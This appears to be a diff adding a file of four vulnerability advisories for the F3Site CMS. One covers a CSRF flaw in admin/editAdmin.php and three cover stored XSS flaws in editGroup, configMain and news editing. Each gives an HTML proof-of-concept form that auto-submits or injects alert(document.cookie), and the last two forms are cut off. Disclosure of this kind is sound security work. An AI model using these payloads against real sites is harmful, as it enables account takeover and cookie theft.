@@ -1,0 +1,109 @@
+Vulnerability ID: HTB22757
+Reference: http://www.htbridge.ch/advisory/xsrf_csrf_in_f3site.html
+Product: F3Site
+Vendor: COMPMaster ( http://dhost.info/compmaster/ ) 
+Vulnerable Version: 2011 alfa 1 and probably prior versions
+Vendor Notification: 21 December 2010 
+Vulnerability Type: CSRF (Cross-Site Request Forgery)
+Status: Not Fixed, Vendor Alerted, Awaiting Vendor Response
+Risk level: Low 
+Credit: High-Tech Bridge SA - Ethical Hacking & Penetration Testing (http://www.htbridge.ch/) 
+
+Vulnerability Details:
+The vulnerability exists due to failure in the "admin/editAdmin.php" script to properly verify the source of HTTP request.
+
+Successful exploitation of this vulnerability could result in a compromise of the application, theft of cookie-based authentication credentials, disclosure or modification of sensitive data.
+
+Attacker can use browser to exploit this vulnerability. The following PoC is available:
+
+<form action="http://host/admin/editAdmin/USER_ID" method="post" name="main">
+<input type="hidden" name="lv" value="3">
+<input type="hidden" name="+" value="on">
+</form>
+<script>
+document.main.submit();
+</script>
+
+-------------------------------------------------------------------------------------------------------------------------
+Vulnerability ID: HTB22758
+Reference: http://www.htbridge.ch/advisory/xss_vulnerability_in_f3site_2.html
+Product: F3Site
+Vendor: COMPMaster ( http://dhost.info/compmaster/ )
+Vulnerable Version: 2011 alfa 1 and probably prior versions
+Vendor Notification: 21 December 2010
+Vulnerability Type: Stored XSS (Cross Site Scripting)
+Status: Not Fixed, Vendor Alerted, Awaiting Vendor Response
+Risk level: Low
+Credit: High-Tech Bridge SA - Ethical Hacking & Penetration Testing (http://www.htbridge.ch/)
+
+Vulnerability Details:
+User can execute arbitrary JavaScript code within the vulnerable application.
+
+The vulnerability exists due to failure in the "admin/editGroup.php" script to properly sanitize user-supplied input in "dsc" variable. Successful exploitation of this vulnerability could result in a compromise of the application, theft of cookie-based authentication credentials, disclosure or modification of sensitive data.
+
+An attacker can use browser to exploit this vulnerability. The following PoC is available:
+
+<form action="http://host/admin/editGroup" method="post" name="main">
+<input type="hidden" name="name" value="newgrp">
+<input type="hidden" name="access" value="1">
+<input type="hidden" name="opened" value="on">
+<input type="hidden" name="dsc" value='dsc"><script>alert(document.cookie)</script>'>
+</form>
+<script>
+document.main.submit();
+</script>
+
+-------------------------------------------------------------------------------------------------------------------------
+Vulnerability ID: HTB22756
+Reference: http://www.htbridge.ch/advisory/xss_vulnerability_in_f3site_1.html
+Product: F3Site
+Vendor: COMPMaster ( http://dhost.info/compmaster/ )
+Vulnerable Version: 2011 alfa 1 and probably prior versions
+Vendor Notification: 21 December 2010
+Vulnerability Type: Stored XSS (Cross Site Scripting)
+Status: Not Fixed, Vendor Alerted, Awaiting Vendor Response
+Risk level: Medium
+Credit: High-Tech Bridge SA - Ethical Hacking & Penetration Testing (http://www.htbridge.ch/)
+
+Vulnerability Details:
+User can execute arbitrary JavaScript code within the vulnerable application.
+
+The vulnerability exists due to failure in the "admin/configMain.php" script to properly sanitize user-supplied input in "footer" variable. Successful exploitation of this vulnerability could result in a compromise of the application, theft of cookie-based authentication credentials, disclosure or modification of sensitive data.
+
+An attacker can use browser to exploit this vulnerability. The following PoC is available:
+
+<form action="http://host/admin/configMain" method="post" name="main">
+<input type="hidden" name="lang" value="en">
+<input type="hidden" name="skin" value="system">
+<input type="hidden" name="title" value="Website title">
+<input type="hidden" name="footer" value='text"><script>alert(document.cookie)</script>'>
+<input type="hidden" name="metaDesc" value="">
+
+-------------------------------------------------------------------------------------------------------------------------
+Vulnerability ID: HTB22755
+Reference: http://www.htbridge.ch/advisory/xss_vulnerability_in_f3site.html
+Product: F3Site
+Vendor: COMPMaster ( http://dhost.info/compmaster/ )
+Vulnerable Version: 2011 alfa 1 and probably prior versions
+Vendor Notification: 21 December 2010
+Vulnerability Type: Stored XSS (Cross Site Scripting)
+Status: Not Fixed, Vendor Alerted, Awaiting Vendor Response
+Risk level: Medium
+Credit: High-Tech Bridge SA - Ethical Hacking & Penetration Testing (http://www.htbridge.ch/)
+
+Vulnerability Details:
+User can execute arbitrary JavaScript code within the vulnerable application.
+
+The vulnerability exists due to failure in the "mod/edit/new.php" script to properly sanitize user-supplied input in "txt" variable. Successful exploitation of this vulnerability could result in a compromise of the application, theft of cookie-based authentication credentials, disclosure or modification of sensitive data.
+
+An attacker can use browser to exploit this vulnerability. The following PoC is available:
+
+<form action="http://host/edit/5/NEWSID?ref" method="post" name="main">
+<input type="hidden" name="cat" value="1">
+<input type="hidden" name="name" value="tt">
+<input type="hidden" name="access" value="on">
+<input type="hidden" name="img" value="">
+<input type="hidden" name="br" value="on">
+<input type="hidden" name="emo" value="on">
+<input type="hidden" name="txt" value='text"><script>alert(document.cookie)</script>'>
+<input type="hidden" name="text" value="">
